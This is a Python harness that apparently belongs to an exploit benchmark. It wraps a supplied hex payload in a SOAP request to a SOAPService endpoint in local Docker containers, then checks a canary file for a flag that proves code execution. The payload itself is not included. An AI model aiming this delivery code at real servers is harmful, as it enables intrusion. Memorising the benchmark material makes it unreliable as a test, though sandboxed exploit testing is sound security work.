#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {'v0': 'http://127.0.0.1:1', 'v1': 'http://127.0.0.1:2'}
import argparse
import json
import os
import subprocess
import sys
import time
import urllib.request
import urllib.error
from pathlib import Path
SOAP_TMPL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
    '<soapenv:Header/>'
    '<soapenv:Body>'
    '<pcbProbe>'
    '<cus-obj>{hex}</cus-obj>'
    '</pcbProbe>'
    '</soapenv:Body>'
    '</soapenv:Envelope>'
)
HOSTPORT = {"v0": 18630, "v1": 18631}
SERVICE = {"v0": "v0", "v1": "v1"}
def new_flag():
    return os.environ.get("PCB_FLAG") or "PCBFLAG_UNSET"
X = os.environ.get("PCB_X") or new_flag()
HERE = Path(__file__).resolve().parent
def run_probe(candidate, *, version="v1"):
    
    if not isinstance(candidate, dict):
        candidate = {"canary_class": str(candidate)}
    fqcn = str(candidate.get("canary_class"))
    payload_hex = str(candidate.get("payload_hex", ""))
    
    _exec(version, ": > /canary/echo.txt")
    status, resp = _http_post_soap(version, payload_hex)
    time.sleep(1.0)  
    er = _exec(version, "cat /canary/echo.txt 2>/dev/null")
    echo = (er.stdout or "")
    flag_hit = X if X in echo else ""
    return {
        "version": version,
        "id": candidate.get("id"),
        "canary_class": fqcn,
        "http_status": status,
        "X": flag_hit,
        "echo": echo.strip(),
        "resp_snip": resp[:200],
    }
def _http_post_soap(version, payload_hex, timeout=30):
    url = f"http://127.0.0.1:{HOSTPORT[version]}/webtools/control/SOAPService"
    body = SOAP_TMPL.format(hex=payload_hex).encode()
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Content-Type": "text/xml; charset=UTF-8",
                                          "SOAPAction": ""})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "replace")
    except Exception as e:  
        return -1, f"HTTP_ERROR {type(e).__name__}: {e}"
def _exec(version, sh, timeout=30):
    return _compose("exec", "-T", SERVICE[version], "sh", "-c", sh,
                    env={"PCB_X": X}, timeout=timeout)
def _compose(*args, env=None, stdin=None, timeout=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        input=stdin, capture_output=True, check=False, timeout=timeout,
        env={**os.environ, **(env or {})},
    )


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))